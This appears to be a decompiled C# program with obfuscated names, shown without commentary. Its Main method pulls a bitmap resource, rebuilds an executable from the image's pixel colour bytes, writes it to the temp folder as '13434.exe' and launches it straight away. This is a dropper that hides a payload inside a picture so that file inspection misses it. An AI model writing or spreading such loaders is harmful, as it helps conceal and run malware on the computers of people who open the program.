using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class5
{
	public static byte[] smethod_0(Bitmap bitmap_0)
	{
		List<byte> list = new List<byte>();
		checked
		{
			int num = ((Image)bitmap_0).get_Width() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)bitmap_0).get_Height() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = bitmap_0.GetPixel(i, j);
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
			}
			return list.ToArray();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		string text = Path.GetTempPath() + "\\13434.exe";
		ResourceManager resourceManager = new ResourceManager("myRes", Assembly.GetExecutingAssembly());
		Bitmap bitmap_ = (Bitmap)resourceManager.GetObject("Image1");
		byte[] array = smethod_0(bitmap_);
		byte[] bytes = array;
		File.WriteAllBytes(text, bytes);
		Process.Start(text);
		ProjectData.EndApp();
	}
}
